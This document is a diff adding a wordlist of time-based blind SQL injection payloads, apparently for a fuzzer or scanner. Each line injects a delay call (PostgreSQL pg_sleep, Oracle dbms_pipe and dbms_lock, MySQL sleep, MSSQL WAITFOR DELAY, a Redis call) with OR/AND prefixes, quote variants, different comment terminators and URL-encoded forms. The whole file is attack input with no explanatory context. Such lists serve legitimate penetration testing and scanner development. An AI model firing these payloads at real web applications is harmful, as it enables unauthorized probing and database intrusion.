@@ -1,0 +1,4950 @@
+; pg_sleep(25) --
+%3B%20pg_sleep%2825%29%20--
+%3B+pg_sleep%2825%29+--
+'; pg_sleep(25) --'
+;+pg_sleep(25)+--
+%3B%2Bpg_sleep%2825%29%2B--
+';+pg_sleep(25)+--'
+ OR;+pg_sleep(25)+--
+%20OR%3B%2Bpg_sleep%2825%29%2B--
+' OR;+pg_sleep(25)+--'
+ AND;+pg_sleep(25)+--
+%20AND%3B%2Bpg_sleep%2825%29%2B--
+' AND;+pg_sleep(25)+--'
+ AND;AND pg_sleep(25) --
+%20AND%3BAND%20pg_sleep%2825%29%20--
++AND%3BAND+pg_sleep%2825%29+--
+' AND;AND pg_sleep(25) --'
+ OR;OR pg_sleep(25) --
+%20OR%3BOR%20pg_sleep%2825%29%20--
++OR%3BOR+pg_sleep%2825%29+--
+' OR;OR pg_sleep(25) --'
+; AND pg_sleep(25)+--
+%3B%20AND%20pg_sleep%2825%29%2B--
+'; AND pg_sleep(25)+--'
+; OR pg_sleep(25)+--
+%3B%20AND%20pg_sleep%2825%29%2B--
+'; OR pg_sleep(25)+--'
+; AND pg_sleep(25) --
+%3B%20AND%20pg_sleep%2825%29%20--
+'; AND pg_sleep(25) --'
+; OR pg_sleep(25) --
+%3B%20OR%20pg_sleep%2825%29%20--
+'; OR pg_sleep(25) --'
+; dbms_pipe.receive_message(('a'),25) --
+%3B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+%3B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+"; dbms_pipe.receive_message(('a'),25) --"
+;+dbms_pipe.receive_message(('a'),25)+--
+%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+";+dbms_pipe.receive_message(('a'),25)+--"
+ OR;+dbms_pipe.receive_message(('a'),25)+--
+%20OR%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" OR;+dbms_pipe.receive_message(('a'),25)+--"
+ AND;+dbms_pipe.receive_message(('a'),25)+--
+%20AND%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" AND;+dbms_pipe.receive_message(('a'),25)+--"
+ AND;AND dbms_pipe.receive_message(('a'),25) --
+%20AND%3BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++AND%3BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" AND;AND dbms_pipe.receive_message(('a'),25) --"
+ OR;OR dbms_pipe.receive_message(('a'),25) --
+%20OR%3BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++OR%3BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" OR;OR dbms_pipe.receive_message(('a'),25) --"
+; AND dbms_pipe.receive_message(('a'),25)+--
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"; AND dbms_pipe.receive_message(('a'),25)+--"
+; OR dbms_pipe.receive_message(('a'),25)+--
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"; OR dbms_pipe.receive_message(('a'),25)+--"
+; AND dbms_pipe.receive_message(('a'),25) --
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"; AND dbms_pipe.receive_message(('a'),25) --"
+; OR dbms_pipe.receive_message(('a'),25) --
+%3B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"; OR dbms_pipe.receive_message(('a'),25) --"
+; sleep(25) --
+%3B%20sleep%2825%29%20--
+%3B+sleep%2825%29+--
+'; sleep(25) --'
+;+sleep(25)+--
+%3B%2Bsleep%2825%29%2B--
+';+sleep(25)+--'
+ OR;+sleep(25)+--
+%20OR%3B%2Bsleep%2825%29%2B--
+' OR;+sleep(25)+--'
+ AND;+sleep(25)+--
+%20AND%3B%2Bsleep%2825%29%2B--
+' AND;+sleep(25)+--'
+ AND;AND sleep(25) --
+%20AND%3BAND%20sleep%2825%29%20--
++AND%3BAND+sleep%2825%29+--
+' AND;AND sleep(25) --'
+ OR;OR sleep(25) --
+%20OR%3BOR%20sleep%2825%29%20--
++OR%3BOR+sleep%2825%29+--
+' OR;OR sleep(25) --'
+; AND sleep(25)+--
+%3B%20AND%20sleep%2825%29%2B--
+'; AND sleep(25)+--'
+; OR sleep(25)+--
+%3B%20AND%20sleep%2825%29%2B--
+'; OR sleep(25)+--'
+; AND sleep(25) --
+%3B%20AND%20sleep%2825%29%20--
+'; AND sleep(25) --'
+; OR sleep(25) --
+%3B%20OR%20sleep%2825%29%20--
+'; OR sleep(25) --'
+; dbms_lock.sleep(25) --
+%3B%20dbms_lock.sleep%2825%29%20--
+%3B+dbms_lock.sleep%2825%29+--
+'; dbms_lock.sleep(25) --'
+;+dbms_lock.sleep(25)+--
+%3B%2Bdbms_lock.sleep%2825%29%2B--
+';+dbms_lock.sleep(25)+--'
+ OR;+dbms_lock.sleep(25)+--
+%20OR%3B%2Bdbms_lock.sleep%2825%29%2B--
+' OR;+dbms_lock.sleep(25)+--'
+ AND;+dbms_lock.sleep(25)+--
+%20AND%3B%2Bdbms_lock.sleep%2825%29%2B--
+' AND;+dbms_lock.sleep(25)+--'
+ AND;AND dbms_lock.sleep(25) --
+%20AND%3BAND%20dbms_lock.sleep%2825%29%20--
++AND%3BAND+dbms_lock.sleep%2825%29+--
+' AND;AND dbms_lock.sleep(25) --'
+ OR;OR dbms_lock.sleep(25) --
+%20OR%3BOR%20dbms_lock.sleep%2825%29%20--
++OR%3BOR+dbms_lock.sleep%2825%29+--
+' OR;OR dbms_lock.sleep(25) --'
+; AND dbms_lock.sleep(25)+--
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--
+'; AND dbms_lock.sleep(25)+--'
+; OR dbms_lock.sleep(25)+--
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--
+'; OR dbms_lock.sleep(25)+--'
+; AND dbms_lock.sleep(25) --
+%3B%20AND%20dbms_lock.sleep%2825%29%20--
+'; AND dbms_lock.sleep(25) --'
+; OR dbms_lock.sleep(25) --
+%3B%20OR%20dbms_lock.sleep%2825%29%20--
+'; OR dbms_lock.sleep(25) --'
+; redis.call("TIME")[25] --
+%3B%20redis.call%28%22TIME%22%29%5B25%5D%20--
+%3B+redis.call%28%22TIME%22%29%5B25%5D+--
+'; redis.call("TIME")[25] --'
+;+redis.call("TIME")[25]+--
+%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+';+redis.call("TIME")[25]+--'
+ OR;+redis.call("TIME")[25]+--
+%20OR%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' OR;+redis.call("TIME")[25]+--'
+ AND;+redis.call("TIME")[25]+--
+%20AND%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' AND;+redis.call("TIME")[25]+--'
+ AND;AND redis.call("TIME")[25] --
+%20AND%3BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--
++AND%3BAND+redis.call%28%22TIME%22%29%5B25%5D+--
+' AND;AND redis.call("TIME")[25] --'
+ OR;OR redis.call("TIME")[25] --
+%20OR%3BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--
++OR%3BOR+redis.call%28%22TIME%22%29%5B25%5D+--
+' OR;OR redis.call("TIME")[25] --'
+; AND redis.call("TIME")[25]+--
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'; AND redis.call("TIME")[25]+--'
+; OR redis.call("TIME")[25]+--
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'; OR redis.call("TIME")[25]+--'
+; AND redis.call("TIME")[25] --
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'; AND redis.call("TIME")[25] --'
+; OR redis.call("TIME")[25] --
+%3B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'; OR redis.call("TIME")[25] --'
+; WAITFOR DELAY '00:00:25' --
+%3B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+%3B+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+"; WAITFOR DELAY '00:00:25' --"
+;+WAITFOR DELAY '00:00:25'+--
+%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+";+WAITFOR DELAY '00:00:25'+--"
+ OR;+WAITFOR DELAY '00:00:25'+--
+%20OR%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" OR;+WAITFOR DELAY '00:00:25'+--"
+ AND;+WAITFOR DELAY '00:00:25'+--
+%20AND%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" AND;+WAITFOR DELAY '00:00:25'+--"
+ AND;AND WAITFOR DELAY '00:00:25' --
+%20AND%3BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++AND%3BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" AND;AND WAITFOR DELAY '00:00:25' --"
+ OR;OR WAITFOR DELAY '00:00:25' --
+%20OR%3BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++OR%3BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" OR;OR WAITFOR DELAY '00:00:25' --"
+; AND WAITFOR DELAY '00:00:25'+--
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"; AND WAITFOR DELAY '00:00:25'+--"
+; OR WAITFOR DELAY '00:00:25'+--
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"; OR WAITFOR DELAY '00:00:25'+--"
+; AND WAITFOR DELAY '00:00:25' --
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"; AND WAITFOR DELAY '00:00:25' --"
+; OR WAITFOR DELAY '00:00:25' --
+%3B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"; OR WAITFOR DELAY '00:00:25' --"
+; pg_sleep(25) --+-
+%3B%20pg_sleep%2825%29%20--%2B-
+%3B+pg_sleep%2825%29+--%2B-
+'; pg_sleep(25) --+-'
+;+pg_sleep(25)+--+-
+%3B%2Bpg_sleep%2825%29%2B--%2B-
+';+pg_sleep(25)+--+-'
+ OR;+pg_sleep(25)+--+-
+%20OR%3B%2Bpg_sleep%2825%29%2B--%2B-
+' OR;+pg_sleep(25)+--+-'
+ AND;+pg_sleep(25)+--+-
+%20AND%3B%2Bpg_sleep%2825%29%2B--%2B-
+' AND;+pg_sleep(25)+--+-'
+ AND;AND pg_sleep(25) --+-
+%20AND%3BAND%20pg_sleep%2825%29%20--%2B-
++AND%3BAND+pg_sleep%2825%29+--%2B-
+' AND;AND pg_sleep(25) --+-'
+ OR;OR pg_sleep(25) --+-
+%20OR%3BOR%20pg_sleep%2825%29%20--%2B-
++OR%3BOR+pg_sleep%2825%29+--%2B-
+' OR;OR pg_sleep(25) --+-'
+; AND pg_sleep(25)+--+-
+%3B%20AND%20pg_sleep%2825%29%2B--%2B-
+'; AND pg_sleep(25)+--+-'
+; OR pg_sleep(25)+--+-
+%3B%20AND%20pg_sleep%2825%29%2B--%2B-
+'; OR pg_sleep(25)+--+-'
+; AND pg_sleep(25) --+-
+%3B%20AND%20pg_sleep%2825%29%20--%2B-
+'; AND pg_sleep(25) --+-'
+; OR pg_sleep(25) --+-
+%3B%20OR%20pg_sleep%2825%29%20--%2B-
+'; OR pg_sleep(25) --+-'
+; dbms_pipe.receive_message(('a'),25) --+-
+%3B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+%3B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+"; dbms_pipe.receive_message(('a'),25) --+-"
+;+dbms_pipe.receive_message(('a'),25)+--+-
+%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+";+dbms_pipe.receive_message(('a'),25)+--+-"
+ OR;+dbms_pipe.receive_message(('a'),25)+--+-
+%20OR%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" OR;+dbms_pipe.receive_message(('a'),25)+--+-"
+ AND;+dbms_pipe.receive_message(('a'),25)+--+-
+%20AND%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" AND;+dbms_pipe.receive_message(('a'),25)+--+-"
+ AND;AND dbms_pipe.receive_message(('a'),25) --+-
+%20AND%3BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++AND%3BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" AND;AND dbms_pipe.receive_message(('a'),25) --+-"
+ OR;OR dbms_pipe.receive_message(('a'),25) --+-
+%20OR%3BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++OR%3BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" OR;OR dbms_pipe.receive_message(('a'),25) --+-"
+; AND dbms_pipe.receive_message(('a'),25)+--+-
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"; AND dbms_pipe.receive_message(('a'),25)+--+-"
+; OR dbms_pipe.receive_message(('a'),25)+--+-
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"; OR dbms_pipe.receive_message(('a'),25)+--+-"
+; AND dbms_pipe.receive_message(('a'),25) --+-
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"; AND dbms_pipe.receive_message(('a'),25) --+-"
+; OR dbms_pipe.receive_message(('a'),25) --+-
+%3B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"; OR dbms_pipe.receive_message(('a'),25) --+-"
+; sleep(25) --+-
+%3B%20sleep%2825%29%20--%2B-
+%3B+sleep%2825%29+--%2B-
+'; sleep(25) --+-'
+;+sleep(25)+--+-
+%3B%2Bsleep%2825%29%2B--%2B-
+';+sleep(25)+--+-'
+ OR;+sleep(25)+--+-
+%20OR%3B%2Bsleep%2825%29%2B--%2B-
+' OR;+sleep(25)+--+-'
+ AND;+sleep(25)+--+-
+%20AND%3B%2Bsleep%2825%29%2B--%2B-
+' AND;+sleep(25)+--+-'
+ AND;AND sleep(25) --+-
+%20AND%3BAND%20sleep%2825%29%20--%2B-
++AND%3BAND+sleep%2825%29+--%2B-
+' AND;AND sleep(25) --+-'
+ OR;OR sleep(25) --+-
+%20OR%3BOR%20sleep%2825%29%20--%2B-
++OR%3BOR+sleep%2825%29+--%2B-
+' OR;OR sleep(25) --+-'
+; AND sleep(25)+--+-
+%3B%20AND%20sleep%2825%29%2B--%2B-
+'; AND sleep(25)+--+-'
+; OR sleep(25)+--+-
+%3B%20AND%20sleep%2825%29%2B--%2B-
+'; OR sleep(25)+--+-'
+; AND sleep(25) --+-
+%3B%20AND%20sleep%2825%29%20--%2B-
+'; AND sleep(25) --+-'
+; OR sleep(25) --+-
+%3B%20OR%20sleep%2825%29%20--%2B-
+'; OR sleep(25) --+-'
+; dbms_lock.sleep(25) --+-
+%3B%20dbms_lock.sleep%2825%29%20--%2B-
+%3B+dbms_lock.sleep%2825%29+--%2B-
+'; dbms_lock.sleep(25) --+-'
+;+dbms_lock.sleep(25)+--+-
+%3B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+';+dbms_lock.sleep(25)+--+-'
+ OR;+dbms_lock.sleep(25)+--+-
+%20OR%3B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' OR;+dbms_lock.sleep(25)+--+-'
+ AND;+dbms_lock.sleep(25)+--+-
+%20AND%3B%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' AND;+dbms_lock.sleep(25)+--+-'
+ AND;AND dbms_lock.sleep(25) --+-
+%20AND%3BAND%20dbms_lock.sleep%2825%29%20--%2B-
++AND%3BAND+dbms_lock.sleep%2825%29+--%2B-
+' AND;AND dbms_lock.sleep(25) --+-'
+ OR;OR dbms_lock.sleep(25) --+-
+%20OR%3BOR%20dbms_lock.sleep%2825%29%20--%2B-
++OR%3BOR+dbms_lock.sleep%2825%29+--%2B-
+' OR;OR dbms_lock.sleep(25) --+-'
+; AND dbms_lock.sleep(25)+--+-
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'; AND dbms_lock.sleep(25)+--+-'
+; OR dbms_lock.sleep(25)+--+-
+%3B%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'; OR dbms_lock.sleep(25)+--+-'
+; AND dbms_lock.sleep(25) --+-
+%3B%20AND%20dbms_lock.sleep%2825%29%20--%2B-
+'; AND dbms_lock.sleep(25) --+-'
+; OR dbms_lock.sleep(25) --+-
+%3B%20OR%20dbms_lock.sleep%2825%29%20--%2B-
+'; OR dbms_lock.sleep(25) --+-'
+; redis.call("TIME")[25] --+-
+%3B%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+%3B+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+'; redis.call("TIME")[25] --+-'
+;+redis.call("TIME")[25]+--+-
+%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+';+redis.call("TIME")[25]+--+-'
+ OR;+redis.call("TIME")[25]+--+-
+%20OR%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' OR;+redis.call("TIME")[25]+--+-'
+ AND;+redis.call("TIME")[25]+--+-
+%20AND%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' AND;+redis.call("TIME")[25]+--+-'
+ AND;AND redis.call("TIME")[25] --+-
+%20AND%3BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++AND%3BAND+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' AND;AND redis.call("TIME")[25] --+-'
+ OR;OR redis.call("TIME")[25] --+-
+%20OR%3BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++OR%3BOR+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' OR;OR redis.call("TIME")[25] --+-'
+; AND redis.call("TIME")[25]+--+-
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'; AND redis.call("TIME")[25]+--+-'
+; OR redis.call("TIME")[25]+--+-
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'; OR redis.call("TIME")[25]+--+-'
+; AND redis.call("TIME")[25] --+-
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'; AND redis.call("TIME")[25] --+-'
+; OR redis.call("TIME")[25] --+-
+%3B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'; OR redis.call("TIME")[25] --+-'
+; WAITFOR DELAY '00:00:25' --+-
+%3B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+%3B+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+"; WAITFOR DELAY '00:00:25' --+-"
+;+WAITFOR DELAY '00:00:25'+--+-
+%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+";+WAITFOR DELAY '00:00:25'+--+-"
+ OR;+WAITFOR DELAY '00:00:25'+--+-
+%20OR%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" OR;+WAITFOR DELAY '00:00:25'+--+-"
+ AND;+WAITFOR DELAY '00:00:25'+--+-
+%20AND%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" AND;+WAITFOR DELAY '00:00:25'+--+-"
+ AND;AND WAITFOR DELAY '00:00:25' --+-
+%20AND%3BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++AND%3BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" AND;AND WAITFOR DELAY '00:00:25' --+-"
+ OR;OR WAITFOR DELAY '00:00:25' --+-
+%20OR%3BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++OR%3BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" OR;OR WAITFOR DELAY '00:00:25' --+-"
+; AND WAITFOR DELAY '00:00:25'+--+-
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"; AND WAITFOR DELAY '00:00:25'+--+-"
+; OR WAITFOR DELAY '00:00:25'+--+-
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"; OR WAITFOR DELAY '00:00:25'+--+-"
+; AND WAITFOR DELAY '00:00:25' --+-
+%3B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"; AND WAITFOR DELAY '00:00:25' --+-"
+; OR WAITFOR DELAY '00:00:25' --+-
+%3B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"; OR WAITFOR DELAY '00:00:25' --+-"
+; pg_sleep(25) #
+%3B%20pg_sleep%2825%29%20%23
+%3B+pg_sleep%2825%29+%23
+'; pg_sleep(25) #'
+;+pg_sleep(25)+#
+%3B%2Bpg_sleep%2825%29%2B%23
+';+pg_sleep(25)+#'
+ OR;+pg_sleep(25)+#
+%20OR%3B%2Bpg_sleep%2825%29%2B%23
+' OR;+pg_sleep(25)+#'
+ AND;+pg_sleep(25)+#
+%20AND%3B%2Bpg_sleep%2825%29%2B%23
+' AND;+pg_sleep(25)+#'
+ AND;AND pg_sleep(25) #
+%20AND%3BAND%20pg_sleep%2825%29%20%23
++AND%3BAND+pg_sleep%2825%29+%23
+' AND;AND pg_sleep(25) #'
+ OR;OR pg_sleep(25) #
+%20OR%3BOR%20pg_sleep%2825%29%20%23
++OR%3BOR+pg_sleep%2825%29+%23
+' OR;OR pg_sleep(25) #'
+; AND pg_sleep(25)+#
+%3B%20AND%20pg_sleep%2825%29%2B%23
+'; AND pg_sleep(25)+#'
+; OR pg_sleep(25)+#
+%3B%20AND%20pg_sleep%2825%29%2B%23
+'; OR pg_sleep(25)+#'
+; AND pg_sleep(25) #
+%3B%20AND%20pg_sleep%2825%29%20%23
+'; AND pg_sleep(25) #'
+; OR pg_sleep(25) #
+%3B%20OR%20pg_sleep%2825%29%20%23
+'; OR pg_sleep(25) #'
+; dbms_pipe.receive_message(('a'),25) #
+%3B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+%3B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+"; dbms_pipe.receive_message(('a'),25) #"
+;+dbms_pipe.receive_message(('a'),25)+#
+%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+";+dbms_pipe.receive_message(('a'),25)+#"
+ OR;+dbms_pipe.receive_message(('a'),25)+#
+%20OR%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" OR;+dbms_pipe.receive_message(('a'),25)+#"
+ AND;+dbms_pipe.receive_message(('a'),25)+#
+%20AND%3B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" AND;+dbms_pipe.receive_message(('a'),25)+#"
+ AND;AND dbms_pipe.receive_message(('a'),25) #
+%20AND%3BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++AND%3BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" AND;AND dbms_pipe.receive_message(('a'),25) #"
+ OR;OR dbms_pipe.receive_message(('a'),25) #
+%20OR%3BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++OR%3BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" OR;OR dbms_pipe.receive_message(('a'),25) #"
+; AND dbms_pipe.receive_message(('a'),25)+#
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"; AND dbms_pipe.receive_message(('a'),25)+#"
+; OR dbms_pipe.receive_message(('a'),25)+#
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"; OR dbms_pipe.receive_message(('a'),25)+#"
+; AND dbms_pipe.receive_message(('a'),25) #
+%3B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"; AND dbms_pipe.receive_message(('a'),25) #"
+; OR dbms_pipe.receive_message(('a'),25) #
+%3B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"; OR dbms_pipe.receive_message(('a'),25) #"
+; sleep(25) #
+%3B%20sleep%2825%29%20%23
+%3B+sleep%2825%29+%23
+'; sleep(25) #'
+;+sleep(25)+#
+%3B%2Bsleep%2825%29%2B%23
+';+sleep(25)+#'
+ OR;+sleep(25)+#
+%20OR%3B%2Bsleep%2825%29%2B%23
+' OR;+sleep(25)+#'
+ AND;+sleep(25)+#
+%20AND%3B%2Bsleep%2825%29%2B%23
+' AND;+sleep(25)+#'
+ AND;AND sleep(25) #
+%20AND%3BAND%20sleep%2825%29%20%23
++AND%3BAND+sleep%2825%29+%23
+' AND;AND sleep(25) #'
+ OR;OR sleep(25) #
+%20OR%3BOR%20sleep%2825%29%20%23
++OR%3BOR+sleep%2825%29+%23
+' OR;OR sleep(25) #'
+; AND sleep(25)+#
+%3B%20AND%20sleep%2825%29%2B%23
+'; AND sleep(25)+#'
+; OR sleep(25)+#
+%3B%20AND%20sleep%2825%29%2B%23
+'; OR sleep(25)+#'
+; AND sleep(25) #
+%3B%20AND%20sleep%2825%29%20%23
+'; AND sleep(25) #'
+; OR sleep(25) #
+%3B%20OR%20sleep%2825%29%20%23
+'; OR sleep(25) #'
+; dbms_lock.sleep(25) #
+%3B%20dbms_lock.sleep%2825%29%20%23
+%3B+dbms_lock.sleep%2825%29+%23
+'; dbms_lock.sleep(25) #'
+;+dbms_lock.sleep(25)+#
+%3B%2Bdbms_lock.sleep%2825%29%2B%23
+';+dbms_lock.sleep(25)+#'
+ OR;+dbms_lock.sleep(25)+#
+%20OR%3B%2Bdbms_lock.sleep%2825%29%2B%23
+' OR;+dbms_lock.sleep(25)+#'
+ AND;+dbms_lock.sleep(25)+#
+%20AND%3B%2Bdbms_lock.sleep%2825%29%2B%23
+' AND;+dbms_lock.sleep(25)+#'
+ AND;AND dbms_lock.sleep(25) #
+%20AND%3BAND%20dbms_lock.sleep%2825%29%20%23
++AND%3BAND+dbms_lock.sleep%2825%29+%23
+' AND;AND dbms_lock.sleep(25) #'
+ OR;OR dbms_lock.sleep(25) #
+%20OR%3BOR%20dbms_lock.sleep%2825%29%20%23
++OR%3BOR+dbms_lock.sleep%2825%29+%23
+' OR;OR dbms_lock.sleep(25) #'
+; AND dbms_lock.sleep(25)+#
+%3B%20AND%20dbms_lock.sleep%2825%29%2B%23
+'; AND dbms_lock.sleep(25)+#'
+; OR dbms_lock.sleep(25)+#
+%3B%20AND%20dbms_lock.sleep%2825%29%2B%23
+'; OR dbms_lock.sleep(25)+#'
+; AND dbms_lock.sleep(25) #
+%3B%20AND%20dbms_lock.sleep%2825%29%20%23
+'; AND dbms_lock.sleep(25) #'
+; OR dbms_lock.sleep(25) #
+%3B%20OR%20dbms_lock.sleep%2825%29%20%23
+'; OR dbms_lock.sleep(25) #'
+; redis.call("TIME")[25] #
+%3B%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+%3B+redis.call%28%22TIME%22%29%5B25%5D+%23
+'; redis.call("TIME")[25] #'
+;+redis.call("TIME")[25]+#
+%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+';+redis.call("TIME")[25]+#'
+ OR;+redis.call("TIME")[25]+#
+%20OR%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' OR;+redis.call("TIME")[25]+#'
+ AND;+redis.call("TIME")[25]+#
+%20AND%3B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' AND;+redis.call("TIME")[25]+#'
+ AND;AND redis.call("TIME")[25] #
+%20AND%3BAND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++AND%3BAND+redis.call%28%22TIME%22%29%5B25%5D+%23
+' AND;AND redis.call("TIME")[25] #'
+ OR;OR redis.call("TIME")[25] #
+%20OR%3BOR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++OR%3BOR+redis.call%28%22TIME%22%29%5B25%5D+%23
+' OR;OR redis.call("TIME")[25] #'
+; AND redis.call("TIME")[25]+#
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'; AND redis.call("TIME")[25]+#'
+; OR redis.call("TIME")[25]+#
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'; OR redis.call("TIME")[25]+#'
+; AND redis.call("TIME")[25] #
+%3B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'; AND redis.call("TIME")[25] #'
+; OR redis.call("TIME")[25] #
+%3B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'; OR redis.call("TIME")[25] #'
+; WAITFOR DELAY '00:00:25' #
+%3B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+%3B+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+"; WAITFOR DELAY '00:00:25' #"
+;+WAITFOR DELAY '00:00:25'+#
+%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+";+WAITFOR DELAY '00:00:25'+#"
+ OR;+WAITFOR DELAY '00:00:25'+#
+%20OR%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" OR;+WAITFOR DELAY '00:00:25'+#"
+ AND;+WAITFOR DELAY '00:00:25'+#
+%20AND%3B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" AND;+WAITFOR DELAY '00:00:25'+#"
